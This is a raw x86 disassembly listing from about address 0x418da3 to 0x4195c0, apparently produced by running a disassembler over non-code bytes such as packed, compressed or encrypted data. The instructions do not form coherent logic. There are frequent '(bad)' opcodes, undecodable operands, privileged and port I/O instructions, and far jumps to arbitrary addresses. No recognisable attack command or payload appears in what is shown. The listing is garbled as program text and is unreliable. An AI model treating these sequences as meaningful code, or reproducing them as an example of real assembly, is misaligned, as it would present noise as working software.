  418da3:	std    
  418da4:	add    cl,BYTE PTR [eax]
  418da6:	sar    BYTE PTR [ebx-0x2a69ef50],0x47
  418dad:	mov    al,ds:0x2940bf0b
  418db2:	mov    ah,0x1b
  418db4:	pop    DWORD PTR [edi+0x45]
  418db7:	and    BYTE PTR [edi],0xc3
  418dba:	(bad)  
  418dbb:	xchg   esp,eax
  418dbc:	add    BYTE PTR [ecx+esi*4-0x55],bl
  418dc0:	imul   eax,DWORD PTR [eax-0x5f894941],0x6325769e
  418dca:	outs   dx,BYTE PTR ds:[esi]
  418dcb:	loop   0x418d55
  418dcd:	stc    
  418dce:	dec    ebx
  418dcf:	xor    al,BYTE PTR [ebx+0x36]
  418dd2:	jle    0x418e2d
  418dd4:	xchg   DWORD PTR ds:0x670ce026,eax
  418dda:	ja     0x418e57
  418ddc:	mov    esp,0xcd979131
  418de1:	pop    ds
  418de2:	lods   eax,DWORD PTR ds:[esi]
  418de3:	sahf   
  418de4:	inc    edx
  418de5:	or     DWORD PTR [esi+0x726e56f5],esi
  418deb:	aad    0x5f
  418ded:	jle    0x418de3
  418def:	sub    al,0x1c
  418df1:	xor    al,0x88
  418df3:	cs mov eax,0x4437db8b
  418df9:	pop    edx
  418dfa:	pop    edi
  418dfb:	aad    0x6e
  418dfd:	lea    esi,[ecx+0x19]
  418e00:	sub    ebp,ecx
  418e02:	imul   ecx,DWORD PTR es:[ecx-0x71c75a77],0x58cde905
  418e0d:	add    ch,BYTE PTR [eax-0xb]
  418e10:	xchg   ecx,eax
  418e11:	sub    BYTE PTR [esi-0x7f],ah
  418e14:	push   ecx
  418e15:	and    edx,DWORD PTR [edx]
  418e17:	pusha  
  418e18:	mov    ss,edi
  418e1a:	popf   
  418e1b:	xor    DWORD PTR [eax-0x21aa67cd],0x39d73019
  418e25:	ins    BYTE PTR es:[edi],dx
  418e26:	test   eax,0x164283b3
  418e2b:	loop   0x418db5
  418e2d:	shr    edx,0x53
  418e30:	arpl   sp,bx
  418e32:	push   edi
  418e33:	rcr    DWORD PTR [esi-0x6f2b5ef7],cl
  418e39:	xor    bl,BYTE PTR [ecx-0x1c]
  418e3c:	(bad)  
  418e3d:	pop    edi
  418e3e:	or     eax,DWORD PTR [edi]
  418e40:	mov    ch,BYTE PTR [ebx]
  418e42:	add    esp,ecx
  418e44:	inc    ebx
  418e45:	aaa    
  418e46:	test   DWORD PTR [eax-0xb2bfee0],eax
  418e4c:	dec    ebx
  418e4d:	add    eax,DWORD PTR [esi+0x7f2cc029]
  418e53:	test   BYTE PTR [edx],0x3b
  418e56:	push   ds
  418e57:	stos   DWORD PTR es:[edi],eax
  418e58:	pop    eax
  418e59:	dec    esp
  418e5a:	aas    
  418e5b:	jge    0x418e13
  418e5d:	jecxz  0x418e14
  418e5f:	aad    0xd3
  418e61:	dec    ecx
  418e62:	sbb    bl,BYTE PTR [esi+edx*2-0x77137b34]
  418e69:	mov    ds:0xb66f8106,eax
  418e6e:	push   cs
  418e6f:	cmp    edi,DWORD PTR [ebx]
  418e71:	add    esi,eax
  418e73:	sub    DWORD PTR [edi],edi
  418e75:	sub    al,0x9d
  418e77:	jmp    0x418ec1
  418e79:	sub    ebx,DWORD PTR [esi]
  418e7b:	mov    ecx,0x8e12fc0b
  418e80:	cs loope 0x418ee2
  418e83:	aam    0xc4
  418e85:	js     0x418eca
  418e87:	mov    ebx,0x88d9bfbf
  418e8d:	leave  
  418e8e:	test   al,0xe3
  418e90:	mov    edi,0x96ea4099
  418e95:	add    dl,BYTE PTR [edx-0x53648cac]
  418e9b:	arpl   sp,cx
  418e9d:	or     eax,0x4d065763
  418ea2:	inc    edi
  418ea3:	std    
  418ea4:	adc    eax,0xdcf4a882
  418ea9:	hlt    
  418eaa:	das    
  418eab:	aam    0x5
  418ead:	push   ds
  418eae:	add    edx,DWORD PTR [edx+0x2e]
  418eb1:	and    BYTE PTR [ebp-0x66],al
  418eb4:	mov    bl,dl
  418eb6:	jo     0x418f2d
  418eb8:	inc    ecx
  418eb9:	fwait
  418eba:	lods   al,BYTE PTR ds:[esi]
  418ebb:	jbe    0x418eba
  418ebd:	push   ds
  418ebe:	test   BYTE PTR [esi],0xa5
  418ec1:	xor    eax,0x58883065
  418ec6:	lahf   
  418ec7:	enter  0x42ff,0x1e
  418ecb:	or     esp,DWORD PTR [edx-0x3e]
  418ece:	mov    dh,dh
  418ed0:	shl    bh,0x90
  418ed3:	shl    DWORD PTR [eax],cl
  418ed5:	sub    DWORD PTR [ebx-0x2f054ab8],eax
  418edb:	push   cs
  418edc:	or     al,0x4
  418ede:	cmp    BYTE PTR [ebx-0x78],ah
  418ee1:	aas    
  418ee2:	mov    esi,DWORD PTR [ecx-0x305dca67]
  418ee8:	pop    edi
  418ee9:	daa    
  418eea:	push   eax
  418eeb:	rcr    BYTE PTR [edi+edi*2],1
  418eee:	pop    esi
  418eef:	sub    DWORD PTR ds:0xb80ee2bf,ecx
  418ef5:	cwde   
  418ef6:	mov    bh,0x95
  418ef8:	test   DWORD PTR [ecx],edx
  418efa:	popa   
  418efb:	cmp    eax,0x7277a221
  418f00:	sub    bh,ah
  418f02:	(bad)
  418f05:	(bad)  
  418f06:	enter  0xcc86,0xb8
  418f0a:	outs   dx,DWORD PTR ds:[esi]
  418f0b:	xchg   esp,eax
  418f0c:	(bad)  [ecx-0x1e773fee]
  418f12:	add    DWORD PTR [esi],edi
  418f14:	mov    bl,0xff
  418f16:	loope  0x418f05
  418f18:	mov    edx,0x74d2ff32
  418f1d:	push   edi
  418f1e:	phaddw mm7,QWORD PTR [edi+edi*8+0x60fe70a8]
  418f27:	pop    ecx
  418f28:	xchg   ecx,eax
  418f29:	inc    ebx
  418f2a:	sub    ch,ah
  418f2c:	repnz mov ebx,0xa88b9c5e
  418f32:	pop    esp
  418f33:	aam    0xeb
  418f35:	sub    BYTE PTR [ebx],al
  418f37:	(bad)  
  418f38:	fmul   QWORD PTR ds:0x685e951f
  418f3e:	iret   
  418f3f:	push   ss
  418f40:	push   ebx
  418f41:	mov    al,0x30
  418f43:	fdiv   st(0),st
  418f45:	add    bh,BYTE PTR [ebp+esi*8-0x62d6e41e]
  418f4c:	xchg   DWORD PTR [esi+0x1e],ecx
  418f4f:	popa   
  418f50:	xchg   ecx,eax
  418f51:	jp     0x418f0d
  418f53:	mov    ds:0xc634cef1,eax
  418f58:	mov    dl,0x4d
  418f5a:	dec    eax
  418f5b:	rep stos DWORD PTR es:[edi],eax
  418f5d:	add    eax,0xc15e3ba1
  418f62:	test   eax,0x116f880f
  418f67:	rcr    DWORD PTR [ecx+0x310ad680],1
  418f6d:	test   BYTE PTR [ebx],ah
  418f6f:	pushf  
  418f70:	mov    ch,bl
  418f72:	clc    
  418f73:	lock inc esp
  418f75:	ja     0x418fe9
  418f77:	mov    bh,0x89
  418f79:	lods   eax,DWORD PTR ds:[esi]
  418f7a:	inc    ebp
  418f7b:	in     eax,dx
  418f7c:	push   0x3acc8b25
  418f81:	repz jno 0x418f58
  418f84:	cwde   
  418f85:	out    dx,al
  418f86:	test   BYTE PTR [ebx+0x1b],0x89
  418f8a:	sub    dl,BYTE PTR [edx-0x77]
  418f8d:	stc    
  418f8e:	push   ebp
  418f8f:	dec    ecx
  418f90:	int3   
  418f91:	sub    esp,DWORD PTR [edx+0xa]
  418f94:	xor    eax,DWORD PTR [edx]
  418f96:	nop
  418f97:	push   eax
  418f98:	push   0x7c7266ed
  418f9d:	and    BYTE PTR [esi],bl
  418f9f:	push   ebx
  418fa0:	fs scas eax,DWORD PTR es:[edi]
  418fa2:	pop    es
  418fa3:	imul   edx,DWORD PTR [ecx+ebx*2],0x1
  418fa7:	aam    0xe
  418fa9:	xchg   esp,eax
  418faa:	xor    BYTE PTR [eax+0x77],0x92
  418fae:	cmp    edi,DWORD PTR [esi]
  418fb0:	xchg   edi,eax
  418fb1:	mov    ebp,0xc300c342
  418fb6:	dec    ecx
  418fb7:	mov    ecx,0xcdfbf5be
  418fbc:	xchg   ecx,eax
  418fbd:	sbb    ebp,DWORD PTR [esi]
  418fbf:	adc    dl,BYTE PTR [ebx+0x4a]
  418fc2:	daa    
  418fc3:	xlat   BYTE PTR ds:[ebx]
  418fc4:	adc    DWORD PTR [ebx-0x4c],edx
  418fc7:	or     dh,dh
  418fc9:	daa    
  418fca:	jmp    0xb76bf688
  418fcf:	adc    eax,0x58aee232
  418fd4:	cmc    
  418fd5:	add    eax,0xb6234616
  418fda:	xor    esi,DWORD PTR es:[edi+0x5c]
  418fde:	pop    ds
  418fdf:	cmp    eax,0x9fbfba73
  418fe4:	sbb    al,ch
  418fe6:	je     0x418fbc
  418fe8:	mov    ecx,0x8c40368f
  418fed:	jmp    0x3522:0x8788cb55
  418ff4:	sub    ebp,DWORD PTR [ecx]
  418ff6:	shl    DWORD PTR [esi+0x130f870c],cl
  418ffc:	mov    DWORD PTR [eax+0x40881bdf],ecx
  419002:	icebp  
  419003:	fwait
  419004:	mov    BYTE PTR [ecx-0x18],ch
  419007:	(bad)  [eax+esi*4+0x1ec71b9f]
  41900e:	xchg   edx,eax
  41900f:	int    0x87
  419011:	xchg   esi,eax
  419012:	cdq    
  419013:	or     al,0x9
  419015:	fisttp DWORD PTR [edx-0x6]
  419018:	clc    
  419019:	mov    eax,0x21a64560
  41901e:	mov    ecx,0xa130a6c9
  419023:	aam    0x4
  419025:	xchg   ebx,eax
  419026:	hlt    
  419027:	xchg   ecx,eax
  419028:	jae    0x41902b
  41902a:	jg     0x418fe4
  41902c:	mov    edi,DWORD PTR [edi+0x7]
  41902f:	imul   ecx,DWORD PTR [esi+0x0],0xffffff80
  419033:	cmp    al,0x31
  419035:	dec    ebp
  419036:	leave  
  419037:	js     0x418ff3
  419039:	rol    edi,0xd5
  41903c:	fisubr DWORD PTR fs:[edx+0x1f8482cf]
  419043:	pop    ss
  419044:	and    DWORD PTR [edx],ebp
  419046:	mov    dh,0xa5
  419048:	loopne 0x4190b7
  41904a:	fwait
  41904b:	aam    0xad
  41904d:	sbb    DWORD PTR [esi+0xa],esi
  419050:	pop    ebx
  419051:	push   eax
  419052:	bound  edx,QWORD PTR [ecx]
  419054:	mov    BYTE PTR [ebx-0x2bbe298],cl
  41905a:	retf   
  41905b:	ja     0x4190a7
  41905d:	add    cl,BYTE PTR [edx+0x37]
  419060:	pusha  
  419061:	lds    edi,FWORD PTR [ecx]
  419063:	xor    esp,DWORD PTR [ebx+0x2827bcd1]
  419069:	mul    BYTE PTR [eax-0x41]
  41906c:	fmul   DWORD PTR [ebp-0x3c]
  41906f:	mov    ah,0x44
  419071:	add    ecx,eax
  419073:	ret    
  419074:	sti    
  419075:	retf   0x7719
  419078:	push   edi
  419079:	(bad)  
  41907a:	pop    ds
  41907b:	lds    ecx,FWORD PTR [edx-0x7bc5f603]
  419081:	aas    
  419082:	(bad)  
  419084:	jbe    0x41903d
  419086:	xchg   ecx,eax
  419087:	imul   ecx,DWORD PTR [esi],0xf70f379e
  41908d:	and    eax,0x1285a5d
  419092:	xchg   edi,eax
  419093:	push   ss
  419094:	sub    eax,0x680b0604
  419099:	cmp    BYTE PTR [edi-0x48],dh
  41909c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41909d:	push   edx
  41909e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a0:	or     DWORD PTR [ecx-0x30406b87],ebx
  4190a6:	pop    eax
  4190a7:	xchg   ecx,eax
  4190a8:	inc    edx
  4190a9:	xor    esp,ebp
  4190ab:	(bad)  
  4190ac:	mov    BYTE PTR [eax-0x341de920],dh
  4190b2:	out    0xd5,al
  4190b4:	add    BYTE PTR [esi],dh
  4190b6:	repz imul ecx,DWORD PTR [ebx-0x62],0xfffffff6
  4190bb:	xor    eax,0x70194d8b
  4190c0:	std    
  4190c1:	xlat   BYTE PTR ds:[ebx]
  4190c2:	repz or al,0x58
  4190c5:	iret   
  4190c6:	int    0xd5
  4190c8:	inc    esp
  4190c9:	inc    edx
  4190ca:	and    al,0x2b
  4190cc:	or     bh,dh
  4190ce:	sbb    edi,DWORD PTR [edi-0x78]
  4190d1:	add    edi,DWORD PTR [edi]
  4190d3:	mov    al,ds:0x392aee39
  4190d8:	push   eax
  4190d9:	add    bl,BYTE PTR [edx-0x553ffb24]
  4190df:	retf   0x3c4c
  4190e2:	mov    edx,0x1e3bc865
  4190e7:	add    DWORD PTR [ebx+0xc],eax
  4190ea:	(bad)  
  4190eb:	mov    esp,0xf7241cf5
  4190f0:	fninit 
  4190f2:	xchg   edi,eax
  4190f3:	(bad)
  4190f7:	out    dx,eax
  4190f8:	bnd jae 0x4190d6
  4190fb:	ror    DWORD PTR [ebx-0x41afd336],1
  419101:	test   DWORD PTR [ebx],edx
  419103:	mov    dh,0x26
  419105:	out    dx,al
  419106:	adc    al,0xd4
  419108:	int    0xcc
  41910a:	std    
  41910b:	sbb    BYTE PTR [ecx+esi*4],0xca
  41910f:	xor    eax,0x90935588
  419114:	mov    WORD PTR [ebp+0x6f],fs
  419117:	mov    al,ds:0x5b74029f
  41911c:	add    al,0x9a
  41911e:	mov    ecx,0x6ea213ed
  419123:	pop    es
  419124:	or     eax,0x49388e95
  419129:	push   cs
  41912a:	xchg   DWORD PTR [eax],esi
  41912c:	mov    dl,BYTE PTR [esp+esi*2]
  41912f:	lods   al,BYTE PTR ds:[esi]
  419130:	call   0xf3e4b910
  419135:	add    bl,BYTE PTR [eax+0xd]
  419138:	in     eax,0x2b
  41913a:	jbe    0x41917e
  41913c:	adc    BYTE PTR [edx-0x57dd2be1],ah
  419142:	mov    dl,0x9d
  419144:	fisubr WORD PTR [ebp-0x293d658a]
  41914a:	ins    DWORD PTR es:[edi],dx
  41914b:	push   ebp
  41914c:	rol    BYTE PTR [ebx-0x13],0xf
  419150:	repz mov eax,ds:0x9ff73360
  419156:	pop    ebx
  419157:	bound  edx,QWORD PTR [eax+eiz*2-0x4d1d2a8c]
  41915e:	sti    
  41915f:	jecxz  0x4191d1
  419161:	lea    edx,[edi-0x6392768d]
  419167:	dec    ebx
  419168:	in     al,0xe
  41916a:	aaa    
  41916b:	cmp    al,0xc8
  41916d:	aas    
  41916e:	sub    al,0xe7
  419170:	lock add bl,BYTE PTR [edx-0x2b4b2ec5]
  419177:	or     cl,BYTE PTR [eax-0xde266c7]
  41917d:	(bad)  
  41917e:	sbb    edx,edx
  419180:	mov    ds:0x5a6a8826,eax
  419185:	pop    esi
  419186:	fild   WORD PTR [esi-0x112bbca3]
  41918c:	mov    cl,ah
  41918e:	hlt    
  41918f:	pop    ebp
  419190:	xor    dh,BYTE PTR [edx+edi*4+0x71]
  419194:	add    eax,0x30974c03
  419199:	jecxz  0x4191e3
  41919b:	repz push cs
  41919d:	fdiv   QWORD PTR [ebx]
  41919f:	out    0x88,eax
  4191a1:	shl    DWORD PTR [edi-0x6b9a837],0xb7
  4191a8:	fsubr  QWORD PTR [ebp-0x760ad99d]
  4191ae:	ins    DWORD PTR es:[edi],dx
  4191af:	jnp    0x419165
  4191b1:	push   ebp
  4191b2:	scas   al,BYTE PTR es:[edi]
  4191b3:	aam    0x52
  4191b5:	scas   eax,DWORD PTR es:[edi]
  4191b6:	push   ebp
  4191b7:	je     0x419143
  4191b9:	pop    edi
  4191ba:	or     al,0x84
  4191bc:	mov    al,ds:0x28c8bd63
  4191c1:	inc    ebx
  4191c2:	bound  edi,QWORD PTR [ecx+0x29d54996]
  4191c8:	leave  
  4191c9:	sub    bl,ch
  4191cb:	and    DWORD PTR [esi+ebx*4],0xac6aef60
  4191d2:	add    DWORD PTR [ecx-0x2c5e40e2],ecx
  4191d8:	jp     0x41920c
  4191da:	or     al,0x66
  4191dc:	aas    
  4191dd:	gs cs and eax,0xd9608c1d
  4191e4:	loop   0x4191a5
  4191e6:	and    DWORD PTR [eax+0x2],esp
  4191e9:	add    ebx,DWORD PTR [ebp-0x29]
  4191ec:	and    eax,0x346f5689
  4191f1:	sbb    ecx,DWORD PTR [edi]
  4191f3:	adc    al,0xa1
  4191f5:	sub    DWORD PTR [edi],ebx
  4191f7:	shr    DWORD PTR [edi+0x26],1
  4191fa:	mov    esp,0xd1bbe28a
  4191ff:	mov    edx,DWORD PTR [esp+ebp*4]
  419202:	das    
  419203:	xlat   BYTE PTR ds:[ebx]
  419204:	cmp    eax,0x7230096a
  419209:	jnp    0x419267
  41920b:	mov    ds:0x789e6127,eax
  419210:	arpl   WORD PTR ds:0x4b3e0800,si
  419216:	or     dh,BYTE PTR [edi-0x42]
  419219:	test   DWORD PTR [edx],ebp
  41921b:	scas   al,BYTE PTR es:[edi]
  41921c:	mov    ebp,0x8bccb6e7
  419221:	jnp    0x419265
  419223:	imul   eax,DWORD PTR [esi],0x265e9fa6
  419229:	jae    0x41922c
  41922b:	add    eax,0xfef42762
  419230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419231:	idiv   DWORD PTR [eax]
  419233:	xchg   edx,eax
  419234:	imul   edx,DWORD PTR [ecx+0x2db2cd7d],0x1543546b
  41923e:	cld    
  41923f:	fdivr  QWORD PTR [ebx+eax*1]
  419242:	loop   0x4191ea
  419244:	popf   
  419245:	cdq    
  419246:	mov    bh,0xf2
  419248:	sti    
  419249:	fstp   QWORD PTR [edi]
  41924b:	pop    ss
  41924c:	inc    edi
  41924d:	pop    ds
  41924e:	sar    DWORD PTR [ebp-0x32],cl
  419251:	int    0xc4
  419253:	aam    0xde
  419255:	stc    
  419256:	or     eax,0x4d94372d
  41925b:	or     DWORD PTR [esi-0x250d82c7],0xbcf5a1d1
  419265:	pop    ebp
  419266:	cmp    BYTE PTR [ebx],dl
  419268:	and    eax,DWORD PTR [ebx]
  41926a:	cld    
  41926b:	push   0x82d9cf12
  419270:	and    eax,0x555f1e1c
  419275:	sub    al,0xae
  419277:	jns    0x4192af
  419279:	and    al,ch
  41927b:	popf   
  41927c:	pop    ss
  41927d:	das    
  41927e:	popf   
  41927f:	push   esp
  419280:	inc    eax
  419281:	mov    ch,0xe9
  419283:	mov    ah,0x1b
  419285:	scas   al,BYTE PTR es:[edi]
  419286:	pusha  
  419287:	xor    eax,0xc7b64b12
  41928c:	mov    eax,ds:0x38581e08
  419291:	and    DWORD PTR [eax-0x5e],0x9f6c924c
  419298:	dec    edi
  419299:	mov    DWORD PTR [eax],esp
  41929b:	bound  edi,QWORD PTR [edi+ecx*2+0x24f4744]
  4192a2:	cld    
  4192a3:	rcl    BYTE PTR [esi+0x5f5da458],0x3e
  4192aa:	push   ds
  4192ab:	iret   
  4192ac:	xchg   esp,eax
  4192ad:	test   BYTE PTR [esi],dl
  4192af:	push   eax
  4192b0:	xchg   di,ax
  4192b2:	(bad)  
  4192b3:	aam    0x3e
  4192b5:	add    DWORD PTR [ebx-0x67],esp
  4192b8:	les    ebp,FWORD PTR [edi+0x79887a37]
  4192be:	jnp    0x419300
  4192c0:	popa   
  4192c1:	dec    ebx
  4192c2:	cli    
  4192c3:	pop    ebx
  4192c4:	xchg   edi,eax
  4192c5:	add    esp,DWORD PTR [edx-0x32]
  4192c8:	add    bh,al
  4192ca:	xor    BYTE PTR [eax],0x47
  4192cd:	(bad)  
  4192ce:	rcr    BYTE PTR [ecx],1
  4192d0:	xchg   DWORD PTR [ebx+0x3e55233e],ebx
  4192d6:	popa   
  4192d7:	imul   esp,DWORD PTR [ebx],0xfffffff2
  4192da:	fst    st(4)
  4192dc:	fidivr WORD PTR [ecx+0x4d]
  4192df:	out    dx,al
  4192e0:	jo     0x419315
  4192e2:	shr    DWORD PTR [ebp+0x1c54e886],0x9a
  4192e9:	test   DWORD PTR [eax+ebx*2+0x431e33e0],eax
  4192f0:	dec    edx
  4192f1:	sbb    eax,0x89723c63
  4192f6:	dec    eax
  4192f7:	aam    0x63
  4192f9:	imul   edi,edx,0x6d
  4192fc:	jnp    0x41934c
  4192fe:	inc    ebp
  4192ff:	pop    ds
  419300:	mov    DWORD PTR [ebx-0x10a32297],ecx
  419306:	fnstsw WORD PTR [ebx+0x3b]
  419309:	add    esi,DWORD PTR [esi+0x35b1d20a]
  41930f:	dec    eax
  419310:	sbb    DWORD PTR [ebp+0x6bf12960],0x4562da77
  41931a:	cmp    BYTE PTR [edx-0x2cd3a6bc],0x4b
  419321:	mov    ebx,0x81474ee
  419326:	mov    esi,0x1ff15a1d
  41932b:	in     eax,dx
  41932c:	dec    edi
  41932d:	(bad)  
  41932e:	and    DWORD PTR [ecx-0x52],esi
  419331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419332:	mov    ah,0xd5
  419334:	test   al,0xa5
  419336:	jmp    0x40311dbd
  41933b:	dec    esi
  41933c:	mov    BYTE PTR [ebx],bh
  41933e:	rol    esp,cl
  419340:	and    edx,DWORD PTR [edx]
  419342:	dec    esp
  419343:	dec    ebx
  419344:	push   ss
  419345:	adc    DWORD PTR [eax+0x1e713404],ebp
  41934b:	mov    ?,edx
  41934d:	or     BYTE PTR [edi+0x74],ah
  419350:	mov    cl,dl
  419352:	inc    eax
  419353:	sbb    ebx,DWORD PTR [eax]
  419355:	sbb    al,BYTE PTR [ebp+ebp*8-0x1]
  419359:	add    eax,0x934fe710
  41935e:	pop    esp
  41935f:	adc    eax,0xcd7ccb93
  419364:	mov    edx,0x23554860
  419369:	add    eax,0x26af53f
  41936e:	mov    ds,WORD PTR [edx-0x63]
  419371:	inc    DWORD PTR ss:[ebx]
  419374:	mov    bh,0xfe
  419376:	aaa    
  419377:	push   edi
  419378:	mov    DWORD PTR [edi-0x4b],ebx
  41937b:	pop    esi
  41937c:	mov    ds:0xfcf1ac22,al
  419381:	sub    esp,edi
  419383:	sub    DWORD PTR [ebx-0xf68e184],eax
  419389:	and    edi,DWORD PTR [ecx+0x7d]
  41938c:	mov    BYTE PTR [ebp-0x2e],bl
  41938f:	push   edi
  419390:	call   0x6802:0x8f6ef8b4
  419397:	loope  0x419379
  419399:	sub    esi,edi
  41939b:	out    dx,al
  41939c:	leave  
  41939d:	mov    cl,0x46
  41939f:	sbb    DWORD PTR [esi+ebx*8],edx
  4193a2:	and    BYTE PTR [ecx],ch
  4193a4:	jmp    FWORD PTR [ecx]
  4193a6:	sub    BYTE PTR [eax+0x5aa0a0b2],ah
  4193ac:	add    DWORD PTR ds:0xf3d3bb61,ecx
  4193b2:	mov    al,ds:0x20c666d4
  4193b7:	mov    ebx,0xb13035fc
  4193bc:	mov    eax,ds:0x89d134b6
  4193c1:	(bad)  
  4193c2:	shl    DWORD PTR es:[eax+0x22ca7060],0x3
  4193ca:	fisub  WORD PTR [edx+0xc]
  4193cd:	sbb    al,0xd0
  4193cf:	(bad)  
  4193d0:	adc    eax,0x5f335bdd
  4193d5:	mov    edi,0xdf870b60
  4193da:	outs   dx,BYTE PTR ds:[esi]
  4193db:	pop    esi
  4193dc:	sbb    al,BYTE PTR [edx]
  4193de:	mov    ds:0xfe3b78f1,al
  4193e3:	cmp    bl,dh
  4193e5:	(bad)  
  4193e6:	arpl   WORD PTR [edi],di
  4193e8:	call   0x83c2:0xb9c6921
  4193ef:	cmc    
  4193f0:	adc    al,0x2
  4193f2:	add    cl,al
  4193f4:	pop    ecx
  4193f5:	je     0x4193e7
  4193f7:	ret    
  4193f8:	retf   
  4193f9:	push   ss
  4193fa:	pop    ss
  4193fb:	ror    BYTE PTR [edx-0xbd85d17],1
  419401:	adc    esi,DWORD PTR [eax+0x225539a4]
  419407:	fucomp st(5)
  419409:	sbb    al,0x22
  41940b:	xchg   esi,eax
  41940c:	sti    
  41940d:	dec    eax
  41940e:	fstp   QWORD PTR ds:[ecx]
  419411:	test   eax,0x97876620
  419416:	int    0x6
  419418:	sti    
  419419:	mov    bh,0xdf
  41941b:	sbb    al,BYTE PTR [ecx]
  41941d:	add    DWORD PTR [ecx],esi
  41941f:	xor    eax,0xd2b20a96
  419424:	mov    edx,0x457fe406
  419429:	mov    ds:0xe5f87aaa,al
  41942e:	cmp    dl,bh
  419430:	ins    BYTE PTR es:[edi],dx
  419431:	cwde   
  419432:	push   ebp
  419433:	ds xor al,0xce
  419436:	sub    BYTE PTR ss:[eax+0x22dd485d],cl
  41943d:	in     eax,0x8
  41943f:	dec    esi
  419440:	call   0x5208:0x88f4fe73
  419447:	lods   eax,DWORD PTR ds:[esi]
  419448:	pop    es
  419449:	int    0xf9
  41944b:	push   edx
  41944c:	mov    cl,0xc5
  41944e:	fmul   QWORD PTR [esi]
  419450:	mov    esi,esp
  419452:	imul   ebx,DWORD PTR [edi-0x1],0xffffffab
  419456:	jge    0x41944a
  419458:	sub    al,0x3
  41945a:	scas   al,BYTE PTR es:[edi]
  41945b:	jle    0x41949c
  41945d:	(bad)
  419462:	bound  edi,QWORD PTR [ecx+0x23e901da]
  419468:	xchg   esi,eax
  419469:	retf   0xeb08
  41946c:	and    al,0x72
  41946e:	loopne 0x4194ac
  419470:	mov    DWORD PTR [esp+ebp*8],edi
  419473:	adc    DWORD PTR [ebx+0x64],0x35
  419477:	xor    esp,DWORD PTR [ebp+0x4f]
  41947a:	push   ds
  41947b:	ltr    WORD PTR ds:0xad8e55e
  419482:	adc    ebp,0x59a024b9
  419488:	or     dl,BYTE PTR ds:0x9ff242b2
  41948e:	cmp    edx,edi
  419490:	ficom  WORD PTR [ecx-0xf799a3e]
  419496:	xchg   edi,eax
  419497:	aam    0xf3
  419499:	popa   
  41949a:	imul   eax,ebx,0xeef181f4
  4194a0:	lods   al,BYTE PTR ds:[esi]
  4194a1:	or     ebp,DWORD PTR [esi-0x4d8277fe]
  4194a7:	ins    BYTE PTR es:[edi],dx
  4194a8:	and    cl,BYTE PTR [edx]
  4194aa:	xchg   DWORD PTR [esi+0x54ba2aa8],ebx
  4194b0:	sbb    DWORD PTR ds:0x68ee56f2,0x6d
  4194b7:	mov    ecx,0x11c87695
  4194bc:	sub    BYTE PTR [eax],ch
  4194be:	lahf   
  4194bf:	mov    bl,0xc4
  4194c1:	push   cs
  4194c2:	pop    ss
  4194c3:	aam    0x69
  4194c5:	xchg   ebx,eax
  4194c6:	cld    
  4194c7:	or     eax,0x5af74d7d
  4194cc:	mov    al,0x41
  4194ce:	pop    eax
  4194cf:	jnp    0x419486
  4194d1:	dec    ebx
  4194d2:	in     eax,dx
  4194d3:	inc    edx
  4194d4:	pop    esi
  4194d5:	dec    ebx
  4194d6:	(bad)  
  4194d7:	lods   eax,DWORD PTR ds:[esi]
  4194d8:	cmp    dh,ch
  4194da:	jmp    0x419482
  4194dc:	loopne 0x419527
  4194de:	into   
  4194df:	and    BYTE PTR [ecx+0x2b],dh
  4194e2:	pop    ds
  4194e3:	loope  0x41948e
  4194e5:	cli    
  4194e6:	mul    BYTE PTR [ecx]
  4194e8:	lods   al,BYTE PTR ds:[esi]
  4194e9:	rcr    DWORD PTR [eax+edx*1],0x6d
  4194ed:	add    esi,DWORD PTR [eax+0x387c915f]
  4194f3:	mov    dl,ah
  4194f5:	pusha  
  4194f6:	popa   
  4194f7:	adc    DWORD PTR [ecx],0x4b
  4194fa:	in     eax,dx
  4194fb:	(bad)  
  4194fc:	xor    eax,0x2126c068
  419501:	repz or al,0xdb
  419504:	adc    al,BYTE PTR [edx]
  419506:	jo     0x41951c
  419508:	pop    eax
  419509:	mov    eax,0x61eddc70
  41950e:	pop    ds
  41950f:	jecxz  0x4194a6
  419511:	(bad)  
  419512:	(bad)  
  419513:	mov    esi,0xaac23a54
  419518:	ja     0x419594
  41951a:	dec    ecx
  41951b:	je     0x41956a
  41951d:	mov    ds:0x9201d07f,eax
  419522:	bound  eax,QWORD PTR [ebx]
  419524:	lock jecxz 0x4195a6
  419527:	xlat   BYTE PTR ds:[ebx]
  419528:	into   
  419529:	mov    dl,0xc9
  41952b:	and    ecx,DWORD PTR ss:[edi+0x2708b10]
  419532:	bound  ecx,QWORD PTR [ebx-0x44]
  419535:	retf   
  419536:	outs   dx,BYTE PTR ds:[esi]
  419537:	push   DWORD PTR [edi]
  419539:	out    dx,al
  41953a:	pusha  
  41953b:	pop    ecx
  41953c:	(bad)  
  41953d:	mov    ?,WORD PTR [edi+0x45]
  419540:	xchg   edx,eax
  419541:	imul   ecx,DWORD PTR [ecx-0x159c602c],0x3cf3597b
  41954b:	cmp    cl,BYTE PTR [ecx+0x467e191f]
  419551:	fnsave [ebx*1-0x4bebfce1]
  419558:	(bad)  
  419559:	shl    DWORD PTR [ecx],1
  41955b:	jg     0x4195af
  41955d:	outs   dx,DWORD PTR ds:[esi]
  41955e:	push   ds
  41955f:	sub    eax,0x8d604529
  419564:	mov    eax,0x46d2a222
  419569:	sub    DWORD PTR [ecx+0x6e],0x54ff1a1d
  419570:	pop    edi
  419571:	pop    ss
  419572:	push   ds
  419573:	xor    DWORD PTR [ebp+0x2d],0xffffffed
  419577:	jle    0x419533
  419579:	loopne 0x4195b4
  41957b:	(bad)  
  41957c:	js     0x4195c3
  41957e:	ins    DWORD PTR es:[edi],dx
  41957f:	retf   0xc0ca
  419582:	frstor [ebx*4-0x3398a515]
  419589:	inc    ecx
  41958a:	pop    ds
  41958b:	dec    ebp
  41958c:	adc    eax,0x699b8cb0
  419591:	dec    eax
  419592:	sbb    al,0x41
  419594:	jl     0x419519
  419596:	adc    DWORD PTR [edi],ebx
  419598:	or     DWORD PTR [edx+0x28],eax
  41959b:	fmul   QWORD PTR [ecx+0x3f65a443]
  4195a1:	out    0xc9,eax
  4195a3:	cld    
  4195a4:	add    bl,BYTE PTR ds:0x1128906c
  4195aa:	sbb    DWORD PTR [ecx],edi
  4195ac:	fsubr  DWORD PTR [eax-0x6795d19]
  4195b2:	test   DWORD PTR [esi-0x5d3d4e21],0x43de64f5
  4195bc:	mov    ch,0x5
  4195be:	test   BYTE PTR [ebx],bh
  4195c0:	jne    0x419571
